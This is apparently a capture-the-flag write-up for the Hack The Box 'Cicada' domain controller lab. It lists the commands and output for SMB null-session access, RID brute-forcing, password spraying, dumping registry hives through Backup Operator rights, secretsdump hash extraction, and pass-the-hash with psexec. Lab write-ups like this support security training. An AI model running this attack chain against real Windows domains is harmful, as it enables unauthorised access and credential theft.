starting with nmap

`sudo nmap -sC -sV -p- -T4 -oN nmap 10.129.118.129`

```
# Nmap 7.94SVN scan initiated Tue Oct  1 08:50:33 2024 as: nmap -sC -sV -p- -T4 -oN nmap 10.129.218.0
Nmap scan report for 10.129.218.0
Host is up (0.055s latency).
Not shown: 65524 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-10-01 14:52:37Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
|_ssl-date: TLS randomness does not represent time
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
|_ssl-date: TLS randomness does not represent time
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: CICADA-DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2024-10-01T14:53:18
|_  start_date: N/A
|_clock-skew: 7h00m02s
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
```


 basic AD DC , no special permission .

let's start by checking null session against smb , since we don't have any creds

```bash
smbclient -N -L 10.129.118.129
```
![[Pasted image 20241001150832.png]]

we can read files on HR using null session
```bash
smbclient -U ''  \\\\10.129.118.129\\HR
```
![[Pasted image 20241001150951.png]]


I found this 

```text
Dear new hire!

Welcome to Cicada Corp! We're thrilled to have you join our team. As part of our security protocols, it's essential that you change your default password to something unique and secure.

Your default password is: Cicada$M6Corpb*@Lp#nZp!8

To change your password:

1. Log in to your Cicada Corp account** using the provided username and the default password mentioned above.
2. Once logged in, navigate to your account settings or profile settings section.
3. Look for the option to change your password. This will be labeled as "Change Password".
4. Follow the prompts to create a new password**. Make sure your new password is strong, containing a mix of uppercase letters, lowercase letters, numbers, and special characters.
5. After changing your password, make sure to save your changes.

Remember, your password is a crucial aspect of keeping your account secure. Please do not share your password with anyone, and ensure you use a complex password.

If you encounter any issues or need assistance with changing your password, don't hesitate to reach out to our support team at support@cicada.htb.

Thank you for your attention to this matter, and once again, welcome to the Cicada Corp team!

Best regards,
Cicada Corp
```

so we got a password `Cicada$M6Corpb*@Lp#nZp!8` 

we need user to use with password

to get users , I first tried to use null session with nxc

```
nxc smb 10.129.118.129  -u ''   -p '' --users
```

I also tried `asreproasting and passwordspray` using famous wordlist such as https://github.com/insidetrust/statistically-likely-usernames/blob/master/jjsmith.txt

none of them give any results 

and finally I use `rid bruteforcing` and got users

```bash
nxc smb 10.129.118.129  -u 'guest'   -p '' --rid-brute
```

```nxc
SMB         10.129.118.129  445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.129.118.129  445    CICADA-DC        [+] cicada.htb\guest:
SMB         10.129.118.129  445    CICADA-DC        498: CICADA\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.118.129  445    CICADA-DC        500: CICADA\Administrator (SidTypeUser)
SMB         10.129.118.129  445    CICADA-DC        501: CICADA\Guest (SidTypeUser)
SMB         10.129.118.129  445    CICADA-DC        502: CICADA\krbtgt (SidTypeUser)
SMB         10.129.118.129  445    CICADA-DC        512: CICADA\Domain Admins (SidTypeGroup)
SMB         10.129.118.129  445    CICADA-DC        513: CICADA\Domain Users (SidTypeGroup)
SMB         10.129.118.129  445    CICADA-DC        514: CICADA\Domain Guests (SidTypeGroup)
SMB         10.129.118.129  445    CICADA-DC        515: CICADA\Domain Computers (SidTypeGroup)
SMB         10.129.118.129  445    CICADA-DC        516: CICADA\Domain Controllers (SidTypeGroup)
SMB         10.129.118.129  445    CICADA-DC        517: CICADA\Cert Publishers (SidTypeAlias)
SMB         10.129.118.129  445    CICADA-DC        518: CICADA\Schema Admins (SidTypeGroup)
SMB         10.129.118.129  445    CICADA-DC        519: CICADA\Enterprise Admins (SidTypeGroup)
SMB         10.129.118.129  445    CICADA-DC        520: CICADA\Group Policy Creator Owners (SidTypeGroup)
SMB         10.129.118.129  445    CICADA-DC        521: CICADA\Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.118.129  445    CICADA-DC        522: CICADA\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.129.118.129  445    CICADA-DC        525: CICADA\Protected Users (SidTypeGroup)
SMB         10.129.118.129  445    CICADA-DC        526: CICADA\Key Admins (SidTypeGroup)
SMB         10.129.118.129  445    CICADA-DC        527: CICADA\Enterprise Key Admins (SidTypeGroup)
SMB         10.129.118.129  445    CICADA-DC        553: CICADA\RAS and IAS Servers (SidTypeAlias)
SMB         10.129.118.129  445    CICADA-DC        571: CICADA\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.129.118.129  445    CICADA-DC        572: CICADA\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.129.118.129  445    CICADA-DC        1000: CICADA\CICADA-DC$ (SidTypeUser)
SMB         10.129.118.129  445    CICADA-DC        1101: CICADA\DnsAdmins (SidTypeAlias)
SMB         10.129.118.129  445    CICADA-DC        1102: CICADA\DnsUpdateProxy (SidTypeGroup)
SMB         10.129.118.129  445    CICADA-DC        1103: CICADA\Groups (SidTypeGroup)
SMB         10.129.118.129  445    CICADA-DC        1104: CICADA\john.smoulder (SidTypeUser)
SMB         10.129.118.129  445    CICADA-DC        1105: CICADA\sarah.dantelia (SidTypeUser)
SMB         10.129.118.129  445    CICADA-DC        1106: CICADA\michael.wrightson (SidTypeUser)
SMB         10.129.118.129  445    CICADA-DC        1108: CICADA\david.orelious (SidTypeUser)
SMB         10.129.118.129  445    CICADA-DC        1109: CICADA\Dev Support (SidTypeGroup)
SMB         10.129.118.129  445    CICADA-DC        1601: CICADA\emily.oscars (SidTypeUser)
```

I extract users and use them to spray with the password we got earlier

```bash
nxc smb  10.129.118.129  -u user  -p 'Cicada$M6Corpb*@Lp#nZp!8'  --continue-on-success
```

and we got two hits
```bash
SMB         10.129.118.129  445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.129.118.129  445    CICADA-DC        [-] cicada.htb\john.smoulder:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE
SMB         10.129.118.129  445    CICADA-DC        [-] cicada.htb\sarah.dantelia:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE
SMB         10.129.118.129  445    CICADA-DC        [+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8
SMB         10.129.118.129  445    CICADA-DC        [-] cicada.htb\david.orelious:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE
SMB         10.129.118.129  445    CICADA-DC        [+] cicada.htb\Dev:Cicada$M6Corpb*@Lp#nZp!8
SMB         10.129.118.129  445    CICADA-DC        [-] cicada.htb\emily.oscars:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE
```

I enumerate a little bit and a found another creds 
```bash
nxc smb  10.129.118.129  -u 'michael.wrightson'  -p 'Cicada$M6Corpb*@Lp#nZp!8'  --users

SMB         10.129.118.129  445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.129.118.129  445    CICADA-DC        [+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8
SMB         10.129.118.129  445    CICADA-DC        -Username-                    -Last PW Set-       -BadPW- -Description-
SMB         10.129.118.129  445    CICADA-DC        Administrator                 2024-08-26 20:08:03 0       Built-in account for administering the computer/domain
SMB         10.129.118.129  445    CICADA-DC        Guest                         2024-08-28 17:26:56 0       Built-in account for guest access to the computer/domain
SMB         10.129.118.129  445    CICADA-DC        krbtgt                        2024-03-14 11:14:10 0       Key Distribution Center Service Account
SMB         10.129.118.129  445    CICADA-DC        john.smoulder                 2024-03-14 12:17:29 1
SMB         10.129.118.129  445    CICADA-DC        sarah.dantelia                2024-03-14 12:17:29 1
SMB         10.129.118.129  445    CICADA-DC        michael.wrightson             2024-03-14 12:17:29 0
SMB         10.129.118.129  445    CICADA-DC        david.orelious                2024-03-14 12:17:29 1       Just in case I forget my password is aRt$Lp#7t*VQ!3
SMB         10.129.118.129  445    CICADA-DC        emily.oscars                  2024-08-22 21:20:17 1
```


basic enumeration again , but this time with new creds 

```bash
nxc smb  10.129.118.129  -u 'david.orelious'  -p 'aRt$Lp#7t*VQ!3' --shares
```

![[Pasted image 20241001152725.png]]

the new share `DEV` looks interesting
```bash
smbclient -U 'david.orelious'  \\\\10.129.118.129\\DEV
```

![[Pasted image 20241001152911.png]]

```powershell
$sourceDirectory = "C:\smb"
$destinationDirectory = "D:\Backup"

$username = "emily.oscars"
$password = ConvertTo-SecureString "Q!3@Lp#M6b*7t*Vt" -AsPlainText -Force
$credentials = New-Object System.Management.Automation.PSCredential($username, $password)
$dateStamp = Get-Date -Format "yyyyMMdd_HHmmss"
$backupFileName = "smb_backup_$dateStamp.zip"
$backupFilePath = Join-Path -Path $destinationDirectory -ChildPath $backupFileName
Compress-Archive -Path $sourceDirectory -DestinationPath $backupFilePath
Write-Host "Backup completed successfully. Backup file saved to: $backupFilePath"
```

this user is backup operator , we can check it using bloodhound

let's dump the SAM file

```bash
impacket-reg  'cicada.htb'/'emily.oscars'@10.129.118.129 backup -o  '\\127.0.0.1\C$'
```

![[Pasted image 20241001153627.png]]

```bash
smbclient -U 'emily.oscars'  \\\\10.129.118.129\\C$
```

![[Pasted image 20241001153839.png]]


```bash
impacket-secretsdump -sam SAM.save -system SYSTEM.save -security SECURITY.save LOCAL
```

```Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Target system bootKey: 0x3c2b033757a49110a9ee680b46e8d620
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC
$MACHINE.ACC:plain_password_hex:6209748a5ab74c44bd98fc5015b6646467841a634c4a1b2d6733289c33f76fc6427f7ccd8f6d978a79eec3ae49eb8c0b5b14e193ec484ea1152e8a04e01a3403b3111c0373d126a566660a7dd083aec1921d53a82bc5129408627ae5be5e945ed58cfb77a2a50e9ffe7e6a4531febd965181e528815d264885921118fb7a74eff51306dbffa4d6a0c995be5c35063576fc4a3eba39d0168d4601da0a0c12748ae870ff36d7fb044649032f550f04c017f6d94675b3517d06450561c71ddf8734100898bf2c19359c69d1070977f070e3b8180210a92488534726005588c0f269a7e182c3c04b96f7b5bc4af488e128f8
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:188c2f3cb7592e18d1eae37991dee696
[*] DPAPI_SYSTEM
dpapi_machinekey:0x0e3d4a419282c47327eb03989632b3bef8998f71
dpapi_userkey:0x4bb80d985193ae360a4d97f3ca06350b02549fbb
[*] NL$KM
 0000   CC 15 01 F7 64 39 1E 7A  5E 53 8C C1 74 E6 2B 01   ....d9.z^S..t.+.
 0010   36 9B 50 B8 D0 72 23 D9  B6 C5 6E 92 2F 57 08 D8   6.P..r#...n./W..
 0020   1E BA 8E 81 23 25 03 27  36 4C 19 B4 96 CD 25 1F   ....#%.'6L....%.
 0030   8F F9 7F 5D 71 E6 6E 8C  FF CB EB 5E 4E A4 E6 96   ...]q.n....^N...
NL$KM:cc1501f764391e7a5e538cc174e62b01369b50b8d07223d9b6c56e922f5708d81eba8e8123250327364c19b496cd251f8ff97f5d71e66e8cffcbeb5e4ea4e696
[*] Cleaning up...
```

```bash
impacket-psexec cicada.htb/administrator@10.129.118.129  -hashes :2b87e7c93a3e8a0ea4a581937016f341
```

![[Pasted image 20241001154130.png]]